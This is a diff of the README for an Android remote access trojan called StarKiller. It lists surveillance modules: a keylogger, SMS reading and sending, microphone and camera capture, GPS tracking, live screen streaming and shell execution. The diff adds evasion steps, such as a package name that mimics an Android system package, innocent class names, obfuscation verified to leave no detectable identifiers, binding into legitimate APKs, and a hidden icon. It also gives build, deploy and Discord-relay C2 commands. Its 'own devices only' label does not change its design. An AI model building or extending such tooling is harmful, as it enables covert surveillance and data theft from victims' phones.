@@ -24,16 +24,15 @@ AUTHORISATION:   CSEC academic research, own devices
 DOCTRINE:        Israeli cyber methodology — cross-platform capability
                  Windows + Android. Desktop + mobile. Full-spectrum.
 TARGET:          Own Android devices ONLY
-STATUS:          PHASE 1 COMPLETE — paused for VADER rootkit upgrades
-COMMIT:          99191f4 (2026-06-21)
+STATUS:          PHASE 2 COMPLETE — FUD hardened, GUI C2 operational
+COMMIT:          6c3f78d (2026-06-23)
 ```
 
 ### What This Is
 
-Android RAT built from first principles. Kotlin client, Python C2 server, web dashboard.
-Speaks VADER agent protocol (length-prefixed JSON over TCP) — cross-compatible with
-vader_ui.py and vader_agent.py. Includes obfuscation pipeline, APK binder, and
-detection scanner.
+Android RAT built from first principles. Kotlin client, Python C2 server with desktop GUI + Discord relay.
+Speaks VADER agent protocol (length-prefixed JSON over TCP). Includes obfuscation pipeline,
+APK binder, detection scanner, and automated test suite.
 
 Own hardware only. CSEC security research. Private repo.
 
@@ -42,38 +41,41 @@ Own hardware only. CSEC security research. Private repo.
 ```
 StarKiller/
 ├── server/
-│   └── starkiller_c2.py       C2 server — web dashboard + agent listener
-├── client/                     Android Kotlin project
+│   ├── starkiller_c2.py        C2 server — web dashboard + agent listener
+│   ├── starkiller_gui.py       Desktop GUI C2 — tkinter, Discord relay
+│   └── test_client.py          Simulated Android agent for testing
+├── client/                     Android Kotlin project (com.android.internal.svc)
 │   ├── app/
 │   │   ├── src/main/
-│   │   │   ├── kotlin/com/starkiller/agent/
+│   │   │   ├── kotlin/com/android/internal/svc/
 │   │   │   │   ├── MainActivity.kt          Launcher (starts service, hides icon)
-│   │   │   │   ├── StarKillerService.kt     Foreground service + C2 lifecycle
-│   │   │   │   ├── C2Client.kt              VADER protocol (encrypted strings)
-│   │   │   │   ├── TaskRouter.kt            Task dispatch to modules
-│   │   │   │   ├── Config.kt               Encrypted C2 config (build-time injected)
-│   │   │   │   ├── Crypt.kt                Runtime XOR+Base64 string decryption
+│   │   │   │   ├── SyncService.kt           Foreground service + C2 lifecycle
+│   │   │   │   ├── SyncAdapter.kt           VADER protocol (encrypted strings)
+│   │   │   │   ├── Dispatcher.kt            Task dispatch to modules (modA-modJ)
+│   │   │   │   ├── Config.kt                Encrypted C2 config (build-time injected)
+│   │   │   │   ├── Crypt.kt                 Runtime XOR+Base64 string decryption
+│   │   │   │   ├── GrantActivity.kt         MediaProjection permission grant
 │   │   │   │   ├── persistence/
-│   │   │   │   │   └── BootReceiver.kt      BOOT_COMPLETED auto-start
+│   │   │   │   │   └── StartReceiver.kt     BOOT_COMPLETED auto-start
 │   │   │   │   └── modules/
-│   │   │   │       ├── DeviceInfo.kt        IMEI, model, carrier, Android ID
-│   │   │   │       ├── CameraCapture.kt     Camera2 API — front/rear JPEG
-│   │   │   │       ├── SmsModule.kt         SMS read inbox + send
-│   │   │   │       ├── GpsTracker.kt        GPS/network location
-│   │   │   │       ├── ContactsDump.kt      Full contact list export
-│   │   │   │       ├── FileManager.kt       Directory list + file download
-│   │   │   │       ├── MicRecorder.kt       Ambient audio (configurable duration)
-│   │   │   │       ├── ScreenCapture.kt     Screenshot (needs MediaProjection)
-│   │   │   │       ├── KeyLogService.kt     Accessibility Service keylogger
-│   │   │   │       ├── CallLogReader.kt     Call history dump
-│   │   │   │       ├── AppList.kt           Installed packages
-│   │   │   │       └── NotifListenerService.kt  Notification interception
+│   │   │   │       ├── SysInfo.kt           IMEI, model, carrier, Android ID
+│   │   │   │       ├── PhotoHelper.kt       Camera2 API — front/rear JPEG
+│   │   │   │       ├── MsgReader.kt         SMS read inbox + send
+│   │   │   │       ├── LocProvider.kt       GPS/network location
+│   │   │   │       ├── AddrBook.kt          Full contact list export
+│   │   │   │       ├── StorageHelper.kt     Directory list + file download
+│   │   │   │       ├── AudioHelper.kt       Ambient audio (configurable duration)
+│   │   │   │       ├── DisplayHelper.kt     Screenshot + VNC stream (MediaProjection)
+│   │   │   │       ├── InputService.kt      Accessibility Service keylogger
+│   │   │   │       ├── HistoryReader.kt     Call history dump
+│   │   │   │       ├── PkgScanner.kt        Installed packages
+│   │   │   │       └── AlertService.kt      Notification interception
 │   │   │   ├── res/
 │   │   │   │   ├── values/strings.xml
 │   │   │   │   └── xml/accessibility_config.xml
-│   │   │   └── AndroidManifest.xml          All permissions + services declared
-│   │   ├── build.gradle.kts                 SDK 34, Kotlin 1.9.24, ProGuard
-│   │   └── proguard-rules.pro              Hardened (5-pass, repackage, strip logs)
+│   │   │   └── AndroidManifest.xml
+│   │   ├── build.gradle.kts                 SDK 34, Kotlin 1.9.24, R8 on debug+release
+│   │   └── proguard-rules.pro               Hardened (5-pass, repackage, strip all)
 │   ├── build.gradle.kts                     AGP 8.5.0
 │   ├── settings.gradle.kts
 │   └── gradle.properties
@@ -81,18 +83,20 @@ StarKiller/
 │   ├── apktool.jar             APK decompile/recompile (v3.0.2)
 │   ├── jadx/                   DEX decompiler for verification
 │   └── uber-apk-signer.jar    APK signing (v1.3.0)
-├── payloads/                   Built APKs (gitignored)
+├── payloads/                   Built APKs + backups (gitignored)
 ├── setup.py                    Automated Android SDK + Gradle setup
 ├── build.py                    Build APK with encrypted C2 config
-├── obfuscate.py                String encryption + ProGuard + detection scanner
+├── obfuscate.py                String encryption + ProGuard + DEX scanner
 ├── binder.py                   APK injection (decompile + inject + patch + sign)
-├── test_agents.py              Multi-agent C2 test harness (simulated devices)
+├── test_headless.py            38-test automated integration suite
+├── STARKILLER_MANUAL.md        Full technical manual
+├── CODE_WALKTHROUGH.md         Annotated code walkthrough
 └── README.md
 ```
 
 ### Protocol
 
-Same as VADER agent protocol — StarKiller APK is a mobile vader_agent:
+VADER agent protocol — length-prefixed JSON over TCP:
 
 ```
 Wire format: [4-byte big-endian length][UTF-8 JSON payload]
@@ -101,7 +105,6 @@ Agent -> C2:
   register   — agent_id, hostname, os, platform, model, sdk
   heartbeat  — battery, last_gps
   result     — task_id, data (JSON object with op results)
-  output     — text (console output)
   file_data  — task_id, filename, size, data (base64)
 
 C2 -> Agent:
@@ -110,37 +113,42 @@ C2 -> Agent:
 
 ### Operations
 
-| Module | Op Code | Description |
-|--------|---------|-------------|
-| Device Info | `sysinfo` | Model, OS, carrier, Android ID, battery |
-| Camera | `camera` | Front/rear photo (Camera2 API, JPEG) |
-| SMS Read | `sms_read` | Inbox dump (last 100) |
-| SMS Send | `sms_send` | Send SMS from device |
-| GPS | `gps` | GPS/network location with accuracy |
-| Contacts | `contacts` | Name + number + type |
-| Files | `ls` | Directory listing with metadata |
-| Files | `download` | File download (10MB cap, base64) |
-| Microphone | `mic` | Ambient audio (configurable seconds) |
-| Screen | `screenshot` | Stub — needs MediaProjection grant |
-| Keylogger | `keylog` | Accessibility Service text capture |
-| Call Log | `calllog` | Incoming/outgoing/missed history |
-| App List | `apps` | Package name, label, system flag |
-| Notifications | `notifs` | Real-time notification interception |
-| Shell | `exec` | Execute shell command (sh -c) |
-| Full Recon | `recon` | sysinfo + gps + apps combined |
-| Ping | `ping` | Latency check |
-| Exit | `exit` | Kill agent |
+| # | Op Code | Description |
+|---|---------|-------------|
+| 1 | `sysinfo` | Model, OS, carrier, Android ID, battery |
+| 2 | `camera` | Front/rear photo (Camera2 API, JPEG, base64) |
+| 3 | `sms_read` | Inbox dump (last 100) |
+| 4 | `sms_send` | Send SMS from device |
+| 5 | `gps` | GPS/network location with accuracy |
+| 6 | `contacts` | Name + number + type |
+| 7 | `ls` | Directory listing with metadata |
+| 8 | `download` | File download (10MB cap, base64) |
+| 9 | `upload` | File upload (stub — server-side path) |
+| 10 | `mic` | Ambient audio (configurable seconds) |
+| 11 | `screenshot` | MediaProjection screen capture |
+| 12 | `screen_grant` | Launch transparent MediaProjection grant dialog |
+| 13 | `vnc` | Live screen streaming (configurable interval/frames) |
+| 14 | `calllog` | Incoming/outgoing/missed history |
+| 15 | `apps` | Package name, label, system flag |
+| 16 | `exec` | Shell command execution (sh -c) |
+| 17 | `recon` | sysinfo + gps + apps combined |
+| 18 | `ping` | Latency check |
+| 19 | `exit` | Kill agent |
 
 ### Evasion
 
 | Layer | Technique | Status |
 |-------|-----------|--------|
+| Package name | `com.android.internal.svc` — mimics Android system package | DONE |
+| Class naming | All modules renamed to innocent names (SysInfo, PhotoHelper, etc.) | DONE |
+| Variable naming | Dispatcher uses `modA`-`modJ` — no semantic leaks in DEX | DONE |
 | String encryption | XOR+Base64 all protocol strings + C2 config | DONE |
-| ProGuard/R8 | 5-pass, repackage classes, strip logging | DONE |
-| Config injection | C2 host/port baked at build time, encrypted | DONE |
+| R8 obfuscation | Enabled on debug + release. 5-pass, flatten, repackage, strip sources | DONE |
+| Config injection | C2 host/port baked at build time, encrypted in DEX | DONE |
 | APK binding | Inject into legit APK (apktool decompile + Smali inject) | DONE |
-| Detection scanner | Self-scan for known RAT signatures before deploy | DONE |
-| Icon hiding | Remove launcher icon after first launch | DONE |
+| Detection scanner | Self-scan DEX string tables for known RAT signatures | DONE |
+| Icon hiding | Remove launcher icon after first launch (configurable) | DONE |
+| DEX verification | ZERO payload identifiers in compiled DEX string tables | VERIFIED |
 
 ### Persistence
 
@@ -156,39 +164,58 @@ C2 -> Agent:
 # 1. Setup (one-time) — downloads Android SDK, sets up Gradle
 python setup.py
 
-# 2. Obfuscate + build
-python obfuscate.py full --ip 192.168.1.100 --port 8667
-python build.py --ip 192.168.1.100 --port 8667
+# 2. Build APK with your C2 IP
+python build.py --ip 192.168.1.92 --port 8667
 
-# 3. Start C2
-python server/starkiller_c2.py
-# Dashboard: http://localhost:8666
+# 3. Start GUI C2
+python server/starkiller_gui.py
 
-# 4. Test (no device needed)
-python test_agents.py 127.0.0.1 8667 4
+# 4. Test locally (no phone needed)
+python server/test_client.py --ip 127.0.0.1
 
-# 5. Bind into legit APK (optional)
-python binder.py target.apk --output payloads/bound.apk
+# 5. Run automated test suite
+python test_headless.py
 
-# 6. Scan for detection signatures
-python obfuscate.py scan payloads/
+# 6. Bind into legit APK (optional)
+python binder.py target.apk --payload-smali path/to/smali/
+
+# 7. Scan for detection signatures
+python obfuscate.py scan payloads/starkiller-debug.apk
+
+# 8. Start with Discord relay (internet access)
+python server/starkiller_gui.py --discord-token BOT_TOKEN --channel-id CHANNEL_ID
 ```
 
-### Test Results (2026-06-21)
+### GUI C2 Controller
+
+Desktop tkinter application with:
+- Agent sidebar with live device list
+- Device info panel (model, OS, SDK, battery)
+- 15 operation buttons + FULL RECON + VNC STREAM
+- Live console with color-coded output
+- Command bar for direct task dispatch
+- Discord relay for internet C2 (bypasses NAT)
+- Live screen panel (360x640) for VNC streaming
+
+### Test Results (2026-06-23)
 
 ```
-Multi-target C2 test:
-  4 agents connected (Samsung S24, Pixel 8, OnePlus 12, Xiaomi 14)
-  8 tasks dispatched — sysinfo, GPS, contacts, apps, exec, recon, SMS, ls
-  All returned correct results
-  Kill command verified — single agent disconnect, others unaffected
-  Heartbeat with battery + GPS drift confirmed
+Headless integration suite: 38/38 PASS
+  Phase 1:  Listener bind
+  Phase 2:  Agent registration (6 fields)
+  Phase 3:  Multi-agent (3 concurrent)
+  Phase 4:  Operation dispatch (13 ops)
+  Phase 5:  Heartbeat
+  Phase 6:  File transfer
+  Phase 7:  Disconnect handling
+  Phase 8:  Edge cases (invalid reg, immediate disconnect, oversized msg)
+  Phase 9:  Obfuscation scan (standalone + bound APK)
+  Phase 10: Crypto roundtrip (10 strings)
 
-Detection scanner:
-  Pre-obfuscation:  37 HIGH signatures in source
-  Post-obfuscation: 4 source-only (stripped by R8 at compile)
-  Protocol strings: ALL encrypted (heartbeat, agent_id, register, etc.)
-  C2 config:        Encrypted (no plaintext IP/port in DEX)
+DEX string scan:
+  Standalone APK: 0 payload identifiers in 15,908 strings
+  Bound APK:      0 payload identifiers in 268,229 strings
+  APK size:       969 KB (R8 shrank from 3.1 MB)
 ```
 
 ### Tools Required
@@ -196,10 +223,12 @@ Detection scanner:
 | Tool | Version | Source |
 |------|---------|--------|
 | Java JDK | 17+ | Microsoft OpenJDK / Adoptium |
+| Python | 3.10+ | System |
 | Android SDK | cmdline-tools | setup.py downloads automatically |
 | apktool | 3.0.2 | github.com/iBotPeaches/Apktool |
-| jadx | 1.5.5 | github.com/skylot/jadx |
 | uber-apk-signer | 1.3.0 | github.com/patrickfav/uber-apk-signer |
+| tkinter | stdlib | Included with Python |
+| Pillow | latest | pip install Pillow (for VNC/screenshots) |
 | ADB | 37+ | Optional — for direct install |
 
 ### Research Sources
